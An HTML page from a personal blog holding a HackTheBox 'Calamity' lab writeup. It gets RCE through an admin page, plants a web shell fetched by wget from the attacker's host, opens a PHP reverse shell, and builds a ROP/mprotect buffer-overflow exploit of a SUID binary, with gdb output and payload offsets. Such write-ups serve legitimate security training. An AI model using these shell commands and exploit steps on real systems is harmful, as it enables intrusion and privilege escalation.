@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>[HackTheBox] &#34;Calamity&#34; machine writeup (Checkpoint style) - limitedeternity </title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="[HackTheBox] &#34;Calamity&#34; machine writeup (Checkpoint style)" />
+<meta property="og:description" content="Legend:  [*] – Info [&#43;] – Progress [-] – No use / Dead end [!] – Important [?] – Maybe useful ========== – Next stage  Files: https://mega.nz/folder/YYFxCaJb#0hvxc6kq2zmTHrUp7qcerg
+Checkpoints: [*] 80/tcp: Apache 2.4.18
+[*] wfuzz:
+ /admin.php /uploads (has listing)  [&#43;] $ curl http://10.10.10.27/admin.php yields password.
+[&#43;] Logged in as admin.
+[&#43;] The most elite RCE there.
+&lt;?php sleep(10); ?&gt; [*] We&rsquo;ll use it to upload a shell to /uploads." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://limitedeternity.github.io/posts/htb-calamity-writeup/" />
+<meta property="article:published_time" content="2020-08-21T01:27:10+03:00" />
+<meta property="article:modified_time" content="2020-08-21T01:27:10+03:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[HackTheBox] &#34;Calamity&#34; machine writeup (Checkpoint style)"/>
+<meta name="twitter:description" content="Legend:  [*] – Info [&#43;] – Progress [-] – No use / Dead end [!] – Important [?] – Maybe useful ========== – Next stage  Files: https://mega.nz/folder/YYFxCaJb#0hvxc6kq2zmTHrUp7qcerg
+Checkpoints: [*] 80/tcp: Apache 2.4.18
+[*] wfuzz:
+ /admin.php /uploads (has listing)  [&#43;] $ curl http://10.10.10.27/admin.php yields password.
+[&#43;] Logged in as admin.
+[&#43;] The most elite RCE there.
+&lt;?php sleep(10); ?&gt; [*] We&rsquo;ll use it to upload a shell to /uploads."/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:500,100,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" /><script src="/js/feather.min.js"></script><script src="/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<h1 class="site-title">limitedeternity </h1>
+	<div class="site-description"><h2>Personal blog</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/limitedeternity" title="GitHub"><i data-feather="github"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Main</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">[HackTheBox] &#34;Calamity&#34; machine writeup (Checkpoint style)</h1>
+			<div class="meta">Posted at &mdash; Aug 21, 2020</div>
+		</div>
+
+		<div class="markdown">
+			<h2 id="legend">Legend:</h2>
+<ul>
+<li><code>[*]</code> – Info</li>
+<li><code>[+]</code> – Progress</li>
+<li><code>[-]</code> – No use / Dead end</li>
+<li><code>[!]</code> – Important</li>
+<li><code>[?]</code> – Maybe useful</li>
+<li><code>==========</code> – Next stage</li>
+</ul>
+<h2 id="files">Files:</h2>
+<p><a href="https://mega.nz/folder/YYFxCaJb#0hvxc6kq2zmTHrUp7qcerg">https://mega.nz/folder/YYFxCaJb#0hvxc6kq2zmTHrUp7qcerg</a></p>
+<h2 id="checkpoints">Checkpoints:</h2>
+<p><code>[*]</code> <strong>80/tcp</strong>: Apache 2.4.18</p>
+<p><code>[*]</code> wfuzz:</p>
+<ul>
+<li><code>/admin.php</code></li>
+<li><code>/uploads</code> (<em>has listing</em>)</li>
+</ul>
+<p><code>[+]</code> <code>$ curl http://10.10.10.27/admin.php</code> yields password.</p>
+<p><code>[+]</code> Logged in as admin.</p>
+<p><code>[+]</code> The most elite RCE there.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php sleep(10); ?&gt;
+</code></pre></div><p><code>[*]</code> We&rsquo;ll use it to upload a shell to <strong>/uploads</strong>.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php system(&#34;wget http://10.10.14.12:8000/phpbash.php -O ./uploads/phpbash.php&#34;); ?&gt;
+</code></pre></div><p><code>[+]</code> Success.</p>
+<p><code>[-]</code> Hm. Something kills foreign processes.</p>
+<p><code>[+]</code> Oh, PHP reverse TCP shell worked like a charm:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">php -r &#39;$sock=fsockopen(&#34;10.10.14.12&#34;,4242);passthru(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
+</code></pre></div><p><code>[+]</code> Username: <strong>xalvas</strong>.</p>
+<p><code>[+]</code> Got <strong>user.txt</strong>.</p>
+<p><code>[*]</code> Extracted audio files.</p>
+<p><code>[*]</code> (exiftool) recov.wav has the following comment: &ldquo;Isn&rsquo;t this were we came in?&rdquo;. Pink Floyd, eh?</p>
+<p><code>[-]</code> <a href="https://gist.github.com/reachsumit/583c76ffd740e1a952d65da3c676931f#file-audio-steganography-receiver-py">LSB extraction</a> didn&rsquo;t work.</p>
+<p><code>[-]</code> Nothing in binwalk.</p>
+<p><code>[+]</code> rick.wav and recov.wav sounded like the same track, so I decided to <a href="https://forum.audacityteam.org/viewtopic.php?t=74683">subtract one audio track from another</a>.
+Then I did &ldquo;Tracks &gt; Mix &gt; Mix And Render To New Track&rdquo; and removed other tracks.
+As a result, I got a track (subtracted.wav), where the password is pronounced, but the speech is split in two and the parts are swapped.
+Concatenated these two parts in correct order, cut off silence, exported (password.wav).</p>
+<p><code>[+]</code> SSH&rsquo;d as <strong>xalvas</strong>.</p>
+<p><code>[+]</code> Found SUID binary &ldquo;app/goodluck&rdquo; and its partial source code &ldquo;app/src.c&rdquo;.</p>
+<p><code>[+]</code> ASLR is disabled on machine (what a luck).</p>
+<p><code>[+]</code> NX: true. ROP-ROP.</p>
+<p><code>==============================</code></p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ break main
+Breakpoint 1 at 0x80000d86
+
+gdb-peda$ run
+&lt;...&gt;
+
+gdb-peda$ pattern_create 200 fuzz
+Writing pattern of 200 chars to filename &#34;fuzz&#34;
+
+gdb-peda$ jump debug
+
+&lt;...&gt;
+vulnerable pointer is at bffff600 &lt;--- [!] Points to the buffer. We&#39;ll jump there to execute our shellcode (0xbffff600).
+&lt;...&gt;
+0xbfedf000 0xc0000000 rw-p	[stack] &lt;--- [!] Stack area range
+
+Filename:  fuzz
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x41413341 (&#39;A3AA&#39;)
+ECX: 0xb7fccbcc --&gt; 0x21000 
+EDX: 0x0 
+ESI: 0xb7fcc000 --&gt; 0x1b1db0 
+EDI: 0xb7fcc000 --&gt; 0x1b1db0 
+EBP: 0x65414149 (&#39;IAAe&#39;)
+ESP: 0xbffff620 (&#34;AJAAfAA5AAKAAgAA6AAL\211\343\a\001&#34;)
+EIP: 0x41344141 (&#39;AA4A&#39;)
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+
+&lt;...&gt;
+
+gdb-peda$ pattern offset &#39;AA4A&#39;
+AA4A found at offset: 76
+</code></pre></div><p><code>[!]</code> Size of area to overwrite is <strong>76</strong>.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ p mprotect
+$2 = {&lt;text variable, no debug info&gt;} 0xb7efcd50 &lt;mprotect&gt;
+</code></pre></div><p><code>[!]</code> <code>mprotect</code> is at <strong>0xb7efcd50</strong>.</p>
+<p><code>[*]</code> <code>mprotect</code> man page:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">int mprotect(void *addr, size_t len, int prot);
+DESCRIPTION
+       mprotect() changes protection for the calling process&#39;s memory page(s) containing any part of the address range in the interval [addr, addr+len-1].
+
+#define PROT_READ       0x01            /* page can be read */
+#define PROT_WRITE      0x02            /* page can be written */
+#define PROT_EXEC       0x04            /* page can be executed */
+</code></pre></div><p><code>[!]</code> We&rsquo;ll pass the stack start address as a first argument to make it executable (and get rid of NX protection).</p>
+<p><code>[!]</code> The second argument will be stack&rsquo;s length:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ p/x 0xc0000000 - 0xbfedf000
+$3 = 0x121000
+</code></pre></div><p><code>[!]</code> The third argument, obviously, will be (<code>PROT_EXEC</code> (0x4) | <code>PROT_READ</code> (0x1) | <code>PROT_WRITE</code> (0x2)), which is <strong>0x7</strong>.</p>
+<p><code>[*]</code> Next, we&rsquo;ll need a ROP gadget that is &ldquo;pop-pop-pop-ret&rdquo; to pop 3 arguments, that we pass to <code>mprotect</code>, and then return back. GDB-Peda has a built-in function for ROP gadget search:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ ropgadget libc
+ret = 0xb7e1a417
+addesp_4 = 0xb7e455ea
+popret = 0xb7e1baa6
+pop3ret = 0xb7e317d9
+pop4ret = 0xb7e319a4
+pop2ret = 0xb7e317da
+&lt;...&gt;
+</code></pre></div><p><code>[!]</code> pop3ret is at <strong>0xb7e317d9</strong>.</p>
+<p><code>[!]</code> We&rsquo;ll need a shellcode to execute: <a href="http://shell-storm.org/shellcode/files/shellcode-251.php">http://shell-storm.org/shellcode/files/shellcode-251.php</a></p>
+<p><code>[+]</code> Exploit is ready! (exploit.py)</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ run
+Starting program: /home/xalvas/app/goodluck
+&lt;...&gt;
+Breakpoint 1, 0x80000d86 in main ()
+
+gdb-peda$ jump debug
+Continuing at 0x80000c15.
+
+this function is problematic on purpose
+
+I&#39;m trying to test some things...and that means get control of the program! 
+vulnerable pointer is at bffff600
+memory information on this binary:
+&lt;...&gt;
+
+
+Filename:
+</code></pre></div><p><code>[!]</code> Stop right there. We need to write our payload to a file before passing it to the program:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">xalvas@calamity:/tmp$ wget http://10.10.14.12:8000/exploit.py 
+&lt;...&gt;
+2020-08-19 10:26:02 (71.1 MB/s) - &#39;exploit.py&#39; saved [664/664]
+
+xalvas@calamity:/tmp$ python exploit.py
+</code></pre></div><p><code>[*]</code> Now, we are ready:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Filename: /tmp/fuzz
+
+process 24287 is executing new program: /bin/dash
+
+&lt;...&gt;
+
+$ id
+`[New process 24491]`
+process 24491 is executing new program: /usr/bin/id
+Using host libthread_db library &#34;/lib/i386-linux-gnu/libthread_db.so.1&#34;.
+uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+</code></pre></div><p><code>[*]</code> But we are still isolated as <strong>xalvas</strong>, because we need to perform it without a debugger (debugger doesn&rsquo;t have a SUID bit set).</p>
+<p><code>[*]</code> PS: I see, that I can abuse lxd group, but that&rsquo;s not an intended way of solving this box.</p>
+<p><code>[*]</code> Let&rsquo;s say the exploit we&rsquo;ve written just now is a <strong>stage2</strong>. And we need a <strong>stage1</strong> one. Restart GDB.</p>
+<p><code>====================</code></p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ pattern_create 30 fuzz
+Writing pattern of 30 chars to filename &#34;fuzz&#34;
+
+gdb-peda$ run
+Starting program: /home/xalvas/app/goodluck 
+
+Filename:  /tmp/fuzz
+
+	-----MENU-----
+1) leave message to admin
+2) print session ID
+3)login (admin only)
+4)change user
+5)exit
+
+ action: 3
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x414142a9 
+EBX: 0x41414241 (&#39;ABAA&#39;)
+ECX: 0xa (&#39;\n&#39;)
+EDX: 0xb7fcd87c --&gt; 0x0 
+ESI: 0xb7fcc000 --&gt; 0x1b1db0 
+EDI: 0xb7fcc000 --&gt; 0x1b1db0 
+EBP: 0xbffff648 --&gt; 0x0 
+ESP: 0xbffff620 --&gt; 0x1 
+EIP: 0x80000e6e (&lt;main+247&gt;:	mov    edx,DWORD PTR [eax+0xc])
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+&lt;...&gt;
+
+gdb-peda$ pattern_search &#34;ABAA&#34;
+Registers contain pattern buffer:
+EBX+0 found at offset: 8
+EAX+-104 found at offset: 8
+Pattern buffer found at:
+0x80003068 : offset    0 - size    5 (/home/xalvas/app/goodluck)
+0x80004978 : offset    0 - size   30 ([heap])
+Reference to pattern buffer not found in memory
+</code></pre></div><p><code>[!]</code> We took control of EBX register. Also, buffer size is <strong>8</strong> bytes. Let&rsquo;s check what&rsquo;s at <strong>0x80003068</strong>:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ x/64xb 0x80003068
+0x80003068 &lt;hey&gt;:	0x41	0x41	0x41	0x25	0x41	0x00	0x00	0x00
+0x80003070 &lt;hey+8&gt;:	0x00	0x00	0x00	0x00	0xad	0x21	0x0f	0x01
+0x80003078 &lt;hey+16&gt;:	0x00	0x00	0x00	0x00	0x76	0x99	0x30	0x1f
+0x80003080:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x80003088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x80003090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x80003098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x800030a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+</code></pre></div><p><code>[!]</code> <strong>0x80003068</strong> is a start of &ldquo;hey&rdquo; struct.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ disass main
+   &lt;...&gt;
+   0x80000e68 &lt;+241&gt;:	lea    eax,[ebx+0x68]
+   0x80000e6e &lt;+247&gt;:	mov    edx,DWORD PTR [eax+0xc]
+   0x80000e71 &lt;+250&gt;:	lea    eax,[ebx+0x68]
+   0x80000e77 &lt;+256&gt;:	mov    eax,DWORD PTR [eax+0x10]
+   0x80000e7a &lt;+259&gt;:	sub    esp,0x4
+   0x80000e7d &lt;+262&gt;:	push   edx                         # [*] hey.secret
+   0x80000e7e &lt;+263&gt;:	push   DWORD PTR [ebp-0x14]        # [*] protect
+   0x80000e81 &lt;+266&gt;:	push   eax                         # [*] hey.admin
+   0x80000e82 &lt;+267&gt;:	call   0x80000cc0 &lt;attempt_login&gt;  # [*] attempt_login(hey.admin, protect, hey.secret)
+   &lt;...&gt;
+
+limitedeternity$ cat src.c
+  &lt;...&gt;
+  struct f {
+    char user[USIZE];
+    int secret;
+    int admin;
+    int session;
+  } hey;
+
+  &lt;...&gt;
+  attempt_login(hey.admin, protect, hey.secret);
+  &lt;...&gt;
+</code></pre></div><p><code>[!]</code> So:</p>
+<ul>
+<li>&ldquo;char user[]&rdquo; is located at <strong>0x80003068</strong> and is 8 bytes long (this is our buffer).</li>
+<li>&ldquo;int secret&rdquo; starts at <strong>0x80003070</strong> and is 4 bytes long (because it&rsquo;s int).</li>
+<li>&ldquo;int admin&rdquo; starts at <strong>0x80003074</strong> and is 4 bytes long (because it&rsquo;s int).</li>
+<li>&ldquo;int session&rdquo; starts at <strong>0x80003078</strong> and is 4 bytes long (because it&rsquo;s int).</li>
+</ul>
+<p><code>[!]</code> To make sure we pass through <code>attempt_login</code> function, we need:</p>
+<ul>
+<li>To ensure that &ldquo;hey.secret&rdquo; == &ldquo;protect&rdquo;.</li>
+<li>Make &ldquo;hey.admin&rdquo; != 0.</li>
+</ul>
+<p><code>[!]</code> Knowing that EAX is &ldquo;hey.admin&rdquo; and EDX is &ldquo;hey.secret&rdquo;, let&rsquo;s make pointer equations from assembly code above.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">1) eax = ebx + 0x68
+2) edx = eax + 0xc
+---------------
+edx = ebx + 0x68 + 0xc
+---------------
+edx = ebx + 0x74
+</code></pre></div><p><code>[*]</code> If we can make EDX point to somewhere else in the memory, where value is the same as that of &ldquo;protect/hey.secret&rdquo; variable, then we can make EAX (&ldquo;hey.admin&rdquo;) non-zero without fearing to overwrite something important.</p>
+<p><code>[*]</code> Let&rsquo;s assume we know the value of &ldquo;protect&rdquo; variable. We will store that value in the file and pass it to createusername() function so that it gets stored at the location of &ldquo;hey.user&rdquo; (<strong>0x80003068</strong>). If we make EDX to point to &ldquo;hey.user&rdquo;, then we will able to satisfy &ldquo;hey.secret&rdquo; == &ldquo;protect&rdquo; condition.</p>
+<p><code>[!]</code> So:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">edx = 0x80003068
+-----------------
+0x80003068 = ebx + 0x74
+-----------------
+ebx = 0x80003068 - 0x74 = 0x80002ff4
+</code></pre></div><p><code>[!]</code> The <strong>stage1</strong> payload will be: &ldquo;protect/hey.secret&rdquo; value (4 bytes) + &ldquo;\x41&rdquo; * 4 + EBX (4 bytes). 8 bytes to fill buffer, 4 bytes to put into EBX.</p>
+<p><code>[*]</code> This way we can pass through <code>attempt_login</code> function and call <code>debug</code>. But we still need to know the value of &ldquo;protect&rdquo; variable. We&rsquo;ll need a <strong>stage0</strong> payload for that.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ disass main
+Dump of assembler code for function main:
+   &lt;...&gt;
+   0x80000e4b &lt;+212&gt;:	lea    eax,[ebx+0x68]
+   0x80000e51 &lt;+218&gt;:	mov    eax,DWORD PTR [eax+0x14]
+   0x80000e54 &lt;+221&gt;:	sub    esp,0xc
+   0x80000e57 &lt;+224&gt;:	push   eax
+   0x80000e58 &lt;+225&gt;:	call   0x80000be3 &lt;printdeb&gt;
+   &lt;...&gt;
+</code></pre></div><p><code>[!]</code> As we can see, <code>printdeb</code> function prints contents of EAX. And we know, that EAX depends on EBX. Also, we know that at this moment &ldquo;hey.secret&rdquo; == &ldquo;protect&rdquo;. It&rsquo;s time to make some pointer equations:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">eax = 0x80003070
+----------------
+1) eax = ebx + 0x68
+2) eax = eax + 0x14
+----------------
+0x80003070 = ebx + 0x64 + 0x14
+----------------
+ebx = 0x80003070 - 0x64 - 0x14 = 0x80002ff8
+</code></pre></div><p><code>[!]</code> The <strong>stage0</strong> payload will be: &ldquo;\x41&rdquo; * 8 + EBX (4 bytes). 8 bytes to fill buffer, 4 bytes to put into EBX.</p>
+<p><code>[+]</code> Compounding an exploit and proceeding.</p>
+<p><code>[+]</code> Got root.txt!</p>
+
+		</div><div id="disqus_thread"></div>
+<script type="text/javascript">
+	(function () {
+		
+		
+		if (window.location.hostname == "localhost")
+			return;
+
+		var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+		var disqus_shortname = 'limitedeternity';
+		dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
+		Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div><a href="https://github.com/vividvilla/ezhil">Ezhil theme</a> | Built with <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-113901111-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
